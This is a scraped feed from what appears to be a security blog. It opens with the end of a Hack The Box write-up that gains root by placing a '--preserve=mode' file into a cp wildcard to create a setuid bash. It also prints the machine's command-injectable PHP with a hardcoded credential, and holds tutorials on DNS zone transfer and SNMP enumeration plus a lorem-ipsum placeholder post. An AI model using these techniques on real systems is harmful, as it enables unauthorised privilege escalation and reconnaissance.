<p>if somehow we can leverage the * to copy all binaries in the current folder while preserving the suid bits, then we will have a copy of those binaries but own by root in named.bindmgr directory; and we can execute it.</p>
<h3 id="exploitation">exploitation</h3>
<pre><code>bindmgr@dynstr:~$ cd /dev/shm
bindmgr@dynstr:/dev/shm$ echo &quot;2&quot; &gt; .version
bindmgr@dynstr:/dev/shm$ cp /bin/bash .
bindmgr@dynstr:/dev/shm$ ls -la
total 1160
drwxrwxrwt 2 root root 80 Oct 16 19:36 .
drwxr-xr-x 17 root root 3940 Oct 15 07:02 ..
-rwxr-xr-x 1 bindmgr bindmgr 1183448 Oct 16 19:36 bash
-rw-rw-r-- 1 bindmgr bindmgr 2 Oct 16 19:35 .version
bindmgr@dynstr:/dev/shm$ chmod +s bash
bindmgr@dynstr:/dev/shm$ ls -la
total 1160
drwxrwxrwt 2 root root 80 Oct 16 19:36 .
drwxr-xr-x 17 root root 3940 Oct 15 07:02 ..
-rwsr-sr-x 1 bindmgr bindmgr 1183448 Oct 16 19:36 bash
-rw-rw-r-- 1 bindmgr bindmgr 2 Oct 16 19:35 .version
</code></pre>
<p>If we run the sudo script now, it won&rsquo;t preserve the suid bits; however if we create the file <strong>&ndash;preserve=mode</strong>, then it fouls the copy command into preserving it:</p>
<pre><code>bindmgr@dynstr:/dev/shm$ echo &gt; --preserve=mode
bindmgr@dynstr:/dev/shm$ ls -la
-rwsr-sr-x 1 bindmgr bindmgr 1183448 Oct 16 19:36 bash
-rw-rw-r-- 1 bindmgr bindmgr 1 Oct 16 19:46 '--preserve=mode'
-rw-rw-r-- 1 bindmgr bindmgr 2 Oct 16 19:35 .version
</code></pre>
<p>Let&rsquo;s run the sudo script and see the copied files:</p>
<pre><code>bindmgr@dynstr:/dev/shm$ sudo /usr/local/bin/bindmgr.sh
[..]
bindmgr@dynstr:/dev/shm$ ls -ls /etc/bind/named.bindmgr/
total 1156
1156 -rwsr-sr-x 1 root bind 1183448 Oct 16 19:49 bash
</code></pre>
<p>And it worked like magic, we can now be root with the copied <code>bash -p</code> :</p>
<pre><code>bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p
bash-5.0# id
uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) egid=117(bind) groups=117(bind),1001(bindmgr)
bash-5.0# cat /root/root.txt
95830fa1c17397d63c28e36747817cd1
</code></pre>
<p>and the user flag:</p>
<pre><code>cat /home/bindmgr/user.txt
</code></pre>
<p>e97b312be3776027c261283003b8a890</p>
<h2 id="explore-the-vulnerability">Explore the vulnerability</h2>
<p>Row 7, the IP address is validated =&gt; not exploitable. However, the domain is not validated.</p>
<p>Look at line 12, it executes the $cmd which contains our crafted domain with injected command-line.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php
  <span style="color:#6272a4">// Check authentication
</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>isset(<span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#39;PHP_AUTH_USER&#39;</span>]) <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>isset(<span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#39;PHP_AUTH_PW&#39;</span>]))      { <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;badauth</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>; <span style="color:#ff79c6">exit</span>; }
  <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#39;PHP_AUTH_USER&#39;</span>]<span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#34;:&#34;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#39;PHP_AUTH_PW&#39;</span>]<span style="color:#ff79c6">!==</span><span style="color:#f1fa8c">&#39;dynadns:sndanyd&#39;</span>) { <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;badauth</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>; <span style="color:#ff79c6">exit</span>; }<span style="color:#6272a4">// Set $myip from GET, defaulting to REMOTE_ADDR
</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd;font-style:italic">$myip</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#39;REMOTE_ADDR&#39;</span>];
  <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$valid</span><span style="color:#ff79c6">=</span>filter_var(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;myip&#39;</span>],FILTER_VALIDATE_IP))                       { <span style="color:#8be9fd;font-style:italic">$myip</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$valid</span>; }<span style="color:#ff79c6">if</span>(isset(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;hostname&#39;</span>])) {
    <span style="color:#6272a4">// Check for a valid domain
</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">list</span>(<span style="color:#8be9fd;font-style:italic">$h</span>,<span style="color:#8be9fd;font-style:italic">$d</span>) <span style="color:#ff79c6">=</span> explode(<span style="color:#f1fa8c">&#34;.&#34;</span>,<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;hostname&#39;</span>],<span style="color:#bd93f9">2</span>);
    <span style="color:#8be9fd;font-style:italic">$validds</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">array</span>(<span style="color:#f1fa8c">&#39;dnsalias.htb&#39;</span>,<span style="color:#f1fa8c">&#39;dynamicdns.htb&#39;</span>,<span style="color:#f1fa8c">&#39;no-ip.htb&#39;</span>);
    <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>in_array(<span style="color:#8be9fd;font-style:italic">$d</span>,<span style="color:#8be9fd;font-style:italic">$validds</span>)) { <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;911 [wrngdom: </span><span style="color:#f1fa8c">$d</span><span style="color:#f1fa8c">]</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>; <span style="color:#ff79c6">exit</span>; }
    <span style="color:#6272a4">// Update DNS entry
</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">$cmd</span> <span style="color:#ff79c6">=</span> sprintf(<span style="color:#f1fa8c">&#34;server 127.0.0.1</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">zone %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">update delete %s.%s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">update add %s.%s 30 IN A %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">send</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,<span style="color:#8be9fd;font-style:italic">$d</span>,<span style="color:#8be9fd;font-style:italic">$h</span>,<span style="color:#8be9fd;font-style:italic">$d</span>,<span style="color:#8be9fd;font-style:italic">$h</span>,<span style="color:#8be9fd;font-style:italic">$d</span>,<span style="color:#8be9fd;font-style:italic">$myip</span>);
    system(<span style="color:#f1fa8c">&#39;echo &#34;&#39;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$cmd</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#39;&#34; | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key&#39;</span>,<span style="color:#8be9fd;font-style:italic">$retval</span>);
    <span style="color:#6272a4">// Return good or 911
</span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span><span style="color:#8be9fd;font-style:italic">$retval</span>) {
      <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;good </span><span style="color:#f1fa8c">$myip\n</span><span style="color:#f1fa8c">&#34;</span>;
    } <span style="color:#ff79c6">else</span> {
      <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;911 [nsupdate failed]</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>; <span style="color:#ff79c6">exit</span>;
    }
  } <span style="color:#ff79c6">else</span> {
    <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;nochg </span><span style="color:#f1fa8c">$myip\n</span><span style="color:#f1fa8c">&#34;</span>;
  }
<span style="color:#ff79c6">?&gt;</span>
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>Dns Zone Tranfer</title><link>https://0xade1.github.io/posts/2021/10/dns-zone-tranfer/</link><pubDate>Thu, 14 Oct 2021 00:25:50 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/dns-zone-tranfer/</guid><description>Background What are DNS zone transfers (AXFR) resources: What are DNS zone transfers (AXFR)
DNS being a critical service in the infrastructure, it is rarely alone to avoid single-point-of-failure, and therefore it is required to be frequently replicated. The most common way to avoid editing the same information on multiple servers, is to edit on primary, then copy the whole zone to other servers.
The issue with AXFR AXFR is the simplest mechanism (among others) for DNS Zone Transfer.</description><content type="html"><![CDATA[<h2 id="background">Background</h2>
<h3 id="what-are-dns-zone-transfers-axfr">What are DNS zone transfers (AXFR)</h3>
<blockquote>
<p>resources: <a href="https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/">What are DNS zone transfers (AXFR)</a></p>
</blockquote>
<p>DNS being a critical service in the infrastructure, it is rarely alone to avoid single-point-of-failure, and therefore it is required to be frequently replicated. The most common way to avoid editing the same information on multiple servers, is to edit on primary, then copy the whole zone to other servers.</p>
<h3 id="the-issue-with-axfr">The issue with AXFR</h3>
<p>AXFR is the simplest mechanism (among others) for DNS Zone Transfer. It is client-side initiated and does not require authentication; therefore, any client can attempt to have its copy for the entire zone if a DNS server is not protected.</p>
<h3 id="mitigation-against-dns-zone-transfer">Mitigation against DNS Zone Transfer</h3>
<p>Common protective mechanism such as IP-whitelisting of trusted-nameservers may not be a sufficient mitigation if attacker forges packets within the network; and therefore it is at risk to be dumped. It’s also recommended to use transaction signatures (<a href="https://www.slashroot.in/secure-zone-transfer-bind-using-tsigtransaction-signatures">TSIG</a>) for zone transfers to prevent IP spoofing attempts.</p>
<h2 id="how-to-initiate-a-zone-transfer">How to initiate a Zone Transfer</h2>
<h3 id="find-an-open-port-tcpudp-53">Find an open port TCP/UDP 53</h3>
<p>nmap command can reveal hosts with TCP port 53 open: <code>53/tcp open domain</code>. If it does not, it worth to try as well UDP with <code>nmap -sU</code> to find a DNS service: <code>53/udp open domain</code>. Usually DNS is using UDP except, however it will use TCP when packets are larger then 512 bytes. Therefore DNS over TPC/53 is a good indicator that we should try Zone Transfer.</p>
<p>A deeper nmap scan with <code>-sCV</code> can reveal the DNS server and version being used:</p>
<pre><code>53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
</code></pre>
<p>As well as webserver TLS certificates containing domain information:</p>
<pre><code>443/tcp open   ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=corporate-domain.com/organizationName=CORP/stateOrProvinceName=NY/countryName=US
</code></pre>
<p>Samba shares also may provide some FQDN or hostname information:</p>
<pre><code>| smb-os-discovery:
| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
| Computer name: SomeonesWorkstation
| NetBIOS computer name: SOMEONESWORKSTATION\x00
| Domain name: \x00
| FQDN: SomeonesWorkstation.corporate-domain.com
</code></pre>
<h3 id="confirm-domain-name">Confirm domain name</h3>
<p>When we find a DNS port, we can try first to confirm the DNS domain with nslookup:</p>
<pre><code>nslookup
&gt; server 192.168.1.1
Default server: 192.168.1.1
Address: 192.168.1.1#53
&gt; 192.168.1.1
1.1.168.192.in-addr.arpa        name = ns1.some-domain.com.
</code></pre>
<p>Then, get the list of DNS servers for the domain:</p>
<pre><code>$ dig +short ns zonetransfer.me
nsztm1.digi.ninja.
nsztm2.digi.ninja.
</code></pre>
<h3 id="perform-the-zone-transfer">Perform the Zone Transfer</h3>
<p>Initiate an AXFR request to get a copy of the zone from the primary server:</p>
<pre><code>$ dig axfr @nsztm1.digi.ninja.
[..]
$ dig axfr zonetransfer.me @nsztm1.digi.ninja.
[..]
zonetransfer.me. 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2017042001 172800 900 1209600 3600
</code></pre>
<p>A successful zone transfer lists all the known subdomains:</p>
<pre><code>$ dig axfr corporate-domain.com @10.10.10.29
[..]
corporate-domain.com.               604800  IN      SOA     corporate-domain.com. intranet.corporate-domain.com. 2 604800 86400 2419200 604800
corporate-domain.com.               604800  IN      NS      ns.corporate-domain.com.
corporate-domain.com.               604800  IN      A       10.10.10.29
ns.corporate-domain.com.            604800  IN      A       10.10.10.29
www.corporate-domain.com.           604800  IN      CNAME   corporate-domain.com.
corporate-domain.com.               604800  IN      SOA     corporate-domain.com. intranet.corporate-domain.com. 2 604800 86400 2419200 604800
</code></pre>
<h2 id="what-if-the-zone-transfer-fails">What if the zone transfer fails</h2>
<p>If the transfer fails, the output will show <code>Transfer failed.</code> and there is few things that can be done such as:</p>
<ul>
<li>list records associated to known domains with dig
_ Bruteforce DNS domain
<ul>
<li>DNS Enumeration with <code>dnsenum</code></li>
<li>DNS bruteforce with <code>gobuster</code></li>
</ul>
</li>
<li>reverse lookup by IP with <code>dig -x</code></li>
<li>nmap host identification over DNS with <code>-sL --dns-servers &lt;DNS_server_IP&gt;</code> option.</li>
<li>subdomain bruteforce with gobuster</li>
</ul>
<h3 id="list-records-associated-to-known-domains-with-dig">List records associated to known domains with dig</h3>
<p>We may get some records if we simply ask the server what records are associated to the domain. On below example, we get an SOA record but no IP address associated. It could be the same IP address.</p>
<pre><code>$ dig corporate-domain.com @10.10.10.224
[..]
;; OPT PSEUDOSECTION:
;corporate-domain.com.                  IN      A
;; AUTHORITY SECTION:
corporate-domain.com.           86400   IN      SOA     corporate-domain.com. root.corporate-domain.com. 199609206 28800 7200 2419200 86400
</code></pre>
<h3 id="bruteforce-dsn-domain">Bruteforce DSN domain</h3>
<h4 id="dsn-enumeration-with-dnsenum">DSN Enumeration with dnsenum</h4>
<p>dnsenum brute force subdomains over DNS. This is similar to VHOST brute force in a webserver with wfuzz or fuff looking for subdomains, but this time it’s trying to resolve DNS subdomains and see if any come back with records. This takes a while, so run it in the background while looking at other things:</p>
<pre><code>$ sudo apt install dnsenum
$ dnsenum --dnsserver &lt;DNS_SERVER_IP&gt; -f ./seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o scans/dnsenum-bitquark-corporate-domain.com corporate-domain.com
[..]
ns.corporate-domain.com. 259200 IN A 10.197.243.77
proxy.corporate-domain.com. 259200 IN CNAME ns.corporate-domain.com.
ns.corporate-domain.com. 259200 IN A 10.197.243.77
wpad.corporate-domain.com. 259200 IN A 10.197.243.31
[..]
</code></pre>
<p>You have to give it the DNS server IP to look at, otherwise it will use the system resolver and find nothing.</p>
<h4 id="subdomain-bruteforce-with-gobuster">subdomain bruteforce with gobuster</h4>
<pre><code>gobuster dns -d another-domain.com -w ./seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o ./scans/gobuster-bitquark-coporate-domain.com
[..]
Found: ns1.another-domain.com
Found: www.another-domain.com
Found: admin.another-domain.com
</code></pre>
<h3 id="reverse-lookup-by-ip-with-dig--x">Reverse Lookup by IP with dig -x</h3>
<p>Example for one host IP address:</p>
<pre><code>$ dig +noall +answer @10.10.10.224 -x 10.197.243.31
31.243.197.10.in-addr.arpa. 259200 IN   PTR     wpad.corporate-domain.com.
</code></pre>
<p>Loop over all subnet IP addresses (class C):</p>
<pre><code>$ for i in {1..254}; do dig +noall +answer @10.10.10.224 -x 10.197.243.$i; done
31.243.197.10.in-addr.arpa. 259200 IN   PTR     wpad.corporate-domain.com.
77.243.197.10.in-addr.arpa. 259200 IN   PTR     ns.corporate-domain.com.
</code></pre>
<p>This <a href="https://serverfault.com/questions/357058/combining-dig-short-command">post</a> explains how to get all records with ine command. Then You can grep out the types you need if you don&rsquo;t want all of them, or query for each one you want in turn (MX, A, SOA &hellip;):</p>
<pre><code>dig +noall +answer @ns1.myname.com myname.com ANY
</code></pre>
<h3 id="nmap-host-identification-over-dns">nmap host identification over DNS</h3>
<p>Alternatively, nmap has a -sL option, which will do host identification over DNS.It will print a line for each host, so you can grep on <strong>(</strong> which is where a reverse resolution came back. It finds the same hosts as dnsenum.</p>
<pre><code>$ nmap -sL --dns-servers &lt;DNS_SERVER_IP&gt; 10.197.243.0/24 | grep -F '('
Nmap scan report for wpad.corporate-domain.com (10.197.243.31)
Nmap scan report for ns.corporate-domain.com (10.197.243.77)
Nmap done: 256 IP addresses (0 hosts up) scanned in 0.13 seconds
</code></pre>
]]></content></item><item><title>Responder to Capture Domain Hashes</title><link>https://0xade1.github.io/posts/2021/10/responder-to-capture-domain-hashes/</link><pubDate>Wed, 13 Oct 2021 22:11:33 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/responder-to-capture-domain-hashes/</guid><description>Nam quis suscipit lacus. Nullam hendrerit massa ligula, vel finibus nisl rhoncus in. Maecenas urna libero, pulvinar et pellentesque non, auctor id libero. Integer et velit vehicula, sollicitudin sapien et, finibus est. Duis sodales velit vel nisl pharetra, ut feugiat arcu mollis. Phasellus id iaculis nunc. Suspendisse dignissim augue sit amet finibus ornare. Donec mattis mollis odio et pharetra. Vestibulum ut gravida urna. Curabitur fringilla urna est, nec rutrum sem vulputate congue.</description><content type="html">
&lt;p>&lt;em>Nam quis suscipit lacus. Nullam hendrerit massa ligula, vel finibus nisl rhoncus in. Maecenas urna libero, pulvinar et pellentesque non, auctor id libero. Integer et velit vehicula, sollicitudin sapien et, finibus est. Duis sodales velit vel nisl pharetra, ut feugiat arcu mollis. Phasellus id iaculis nunc. Suspendisse dignissim augue sit amet finibus ornare. Donec mattis mollis odio et pharetra. Vestibulum ut gravida urna. Curabitur fringilla urna est, nec rutrum sem vulputate congue. Maecenas ut molestie eros. Quisque eleifend pharetra dui, sed lacinia mauris iaculis a. Donec vel venenatis nulla, non dignissim dui. Curabitur in nisi nec felis dictum ultrices sit amet quis augue.&lt;/em>&lt;/p></content></item><item><title>Don't overlook Snmp Mibs Exploration</title><link>https://0xade1.github.io/posts/2021/10/dont-overlook-snmp-mibs-exploration/</link><pubDate>Sun, 03 Oct 2021 09:51:16 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/dont-overlook-snmp-mibs-exploration/</guid><description>UDP Scan Snmp is among the top 10 ports in nmap UDP scan. The main problem with UDP is that it may not reply to our nmap probes resulting in open|filtered result. It is recommended to use the -sV which may reveal an open port as shown below. Another interesting option is -sC to run common scripts and obtain for example process table or netstat table &amp;hellip;
sudo nmap -sU -sV -sC --top-ports 10 10.</description><content type="html"><![CDATA[<p><img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.ibb.co%2FGpRn5gn%2Ftcpvsudp.jpg&amp;f=1&amp;nofb=1" alt="udp vs tcp"></p>
<h2 id="udp-scan">UDP Scan</h2>
<p>Snmp is among the top 10 ports in nmap UDP scan. The main problem with UDP is that it may not reply to our nmap probes resulting in <code>open|filtered</code> result. It is recommended to use the <code>-sV</code> which may reveal an <code>open</code> port as shown below. Another interesting option is <code>-sC</code> to run common scripts and obtain for example process table or netstat table &hellip;</p>
<pre><code>sudo nmap -sU -sV -sC --top-ports 10    10.10.10.241
sudo nmap -sU -sV -sC -p161             10.10.10.241
</code></pre>
<p>output:</p>
<pre><code>PORT STATE SERVICE VERSION
[..]
161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 4ca7e41263c5985e00000000
|   snmpEngineBoots: 73
|_  snmpEngineTime: 1d22h50m36s
| snmp-processes:
|   1:
|     Name: systemd
|     Path: /usr/lib/systemd/systemd
|     Params: --switched-root --system --deserialize 18
|   [..]
|   26947:
|_    Name: kworker/u4:2-flush-253:0
| snmp-sysdescr: Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_64
|_  System uptime: 1d22h50m36.31s (16863631 timeticks)
</code></pre>
<p>On the above scan it worth to note, the server versions available as it is needed later for exploration with <code>snmpwalk</code>.</p>
<p>While UDP protocol may not respond to nmap, it may respond to legit request, that is why it worth not to be discouraged and try other common tools. For example, for SNMP, a great tool is onesixtyone</p>
<h2 id="discover-a-community-string-with-onesixtyone">Discover a community String with onesixtyone</h2>
<p><a href="https://github.com/trailofbits/onesixtyone">onesixtyone</a> is an enumeration tool to find SNMP community strings.</p>
<pre><code>git clone https://github.com/trailofbits/onesixtyone
cd onesixtyone
gcc -o onesixtyone onesixtyone.c
sudo cp onesixtyone /usr/local/bin/
</code></pre>
<p>We can also try common community-string such as <code>public</code>. On the below example, we found the <code>public</code> community string.</p>
<pre><code>onesixtyone 10.10.10.241
[..]
10.10.10.241 [public] Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_6
</code></pre>
<h2 id="adding-mibs-extensions-to-make-snmp-exploration-intelligible">Adding MIBS extensions to make SNMP exploration intelligible</h2>
<h3 id="background">Background</h3>
<p>Simple Network Management Protocol (snmp) is designed to collect and configure information about devices over the network. The information is organized into a Management Information Base (MIB). Object Identifiers (OID) uniquely identify objects in the MIB.</p>
<p>Running snmpwalk without further setup just prints out OIDs, which aren’t too meaningful. For example:</p>
<table>
<thead>
<tr>
<th>MIBS</th>
<th>OID</th>
<th>Def</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://net-snmp.sourceforge.io/docs/mibs/host.html#scalar_current">HOST-RESOURCES-MIB</a></td>
<td>.1.3.6.1.2.1.25.1.1</td>
<td>system uptime, date, active sessions numbers &hellip;</td>
</tr>
<tr>
<td><a href="https://net-snmp.sourceforge.io/docs/mibs/host.html#hrSWRunTable">hrSWRunName</a></td>
<td>.1.3.6.1.2.1.25.4.2</td>
<td>store the process list</td>
</tr>
<tr>
<td><a href="https://net-snmp.sourceforge.io/docs/mibs/ip.html">ipAddressTable</a></td>
<td>.1.3.6.1.2.1.4.34</td>
<td>ipv4 and ipv6 table</td>
</tr>
<tr>
<td>ipAddressIndex</td>
<td>.1.3.6.1.2.1.4.34.1.3</td>
<td>ipv4 and ipv6 interface index</td>
</tr>
<tr>
<td>ipAddressType</td>
<td>.1.3.6.1.2.1.4.34.1.4</td>
<td>ipv4 and ipv6</td>
</tr>
<tr>
<td>hrSWRunParameters</td>
<td>.1.3.6.1.2.1.25.4.2.1.5</td>
<td>arguments of running</td>
</tr>
<tr>
<td>netstat</td>
<td></td>
<td>netstat tables</td>
</tr>
</tbody>
</table>
<p>Installing mibs extensions turns the not meaningful OID number into its MIB equivalent string definition.</p>
<h3 id="install-and-configure">Install and configure</h3>
<p>For some reasons, I found that adding on <strong>/etc/snmp/snmpd.conf</strong> additional mbdirs, did not work out.
It is important to comment out any row starting with <code>mibs:</code> in the configuration file or the translation won&rsquo;t work.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sudo apt install snmp snmp-mibs-downloader
<span style="color:#6272a4"># sudo /usr/bin/download-mibs</span>
<span style="color:#6272a4"># tells Ubuntu to load SNMP MIB files:</span>
sudo sed -i <span style="color:#f1fa8c">&#39;s/mibs :/# mibs :/g&#39;</span> /etc/snmp/snmp.conf
</code></pre></td></tr></table>
</div>
</div><p>This will install <code>iana</code> and <code>ietf</code> common MIBS extensions, but you may want to find another source for <code>cisco</code> and other systems. This can be added in <strong>/usr/share/snmp/mibs/</strong> directory.</p>
<h3 id="verify-your-installation">verify your installation</h3>
<p>Successful installation when you can translate from OID to MIB</p>
<pre><code>snmptranslate .1.3.6.1.2.1.2.2
IF-MIB::ifTable
</code></pre>
<p>Failed Installation:</p>
<pre><code>snmptranslate .1.3.6.1.2.1.2.2
iso.3.6.1.2.1.2.2
</code></pre>
<p>Reverse translation to translate from MIB to OID:</p>
<pre><code>snmptranslate -On -IR  NET-SNMP-EXTEND-MIB::nsExtendOutput1Line
.1.3.6.1.4.1.8072.1.3.2.3.1.1
snmptranslate -On -IR  hrSWRunTable
.1.3.6.1.2.1.25.4.2
</code></pre>
<h3 id="run-snmpwalk">run snmpwalk</h3>
<p>Dump the entire snmp but the output is usually pretty big so it is recommended to redirect into a file:</p>
<pre><code>snmpwalk -v1 -c public 10.10.10.241 . &gt; snmpwalk-full
</code></pre>
<p>The output should be terminated with <code>End of MIB</code>. If it finishes with <code>Timeout: No Response from 10.10.10.241</code>, then it means the snmpwalk could not complete.</p>
<p>Network latency can lead to timeouts and therefore unreliable report: in this case we can pass <code>-t 10</code> for a tens seconds timeouts, but it will slow down the scan (refer to the <a href="#troubleshoot-hanging-issues">troubleshoot section of this article</a> ).
A more stealthy but expert technique would be to scan a specific OID or MIB instead of the whole dump.</p>
<pre><code>snmpwalk -v1 -c public 10.10.10.241 hrSWRunTable
</code></pre>
<p>Refer to this doc for much more: <a href="https://net-snmp.sourceforge.io/docs/mibs/">https://net-snmp.sourceforge.io/docs/mibs/</a></p>
<h3 id="what-sweet-information-can-we-obtain">What sweet information can we obtain</h3>
<p>domains or subdomains, kernel versions or release date, operating system details:</p>
<pre><code>STRING: Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_64
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (16741406) 1 day, 22:30:14.06
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.8 = STRING: CentOS Linux release 8.3.2011
</code></pre>
<p>process list including running daemons:</p>
<pre><code>snmpwalk -v1 -c public 10.10.10.241 hrSWRunName
